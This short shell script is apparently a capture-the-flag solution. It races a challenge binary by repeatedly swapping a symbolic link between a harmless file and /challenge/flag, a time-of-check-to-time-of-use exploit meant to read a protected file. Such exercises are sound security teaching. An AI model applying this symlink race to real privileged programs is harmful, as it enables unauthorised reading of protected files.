#!/bin/sh

while true
do
# myfile.txt was created and goodfile is its symbolic link 
ln -sf /tmp/ist195674/myfile.txt /tmp/ist195674/goodfile.txt
echo "/tmp/ist195674/goodfile.txt" | /challenge/challenge&
# change the symbolic link to the flag
ln -sf /challenge/flag /tmp/ist195674/goodfile.txt
done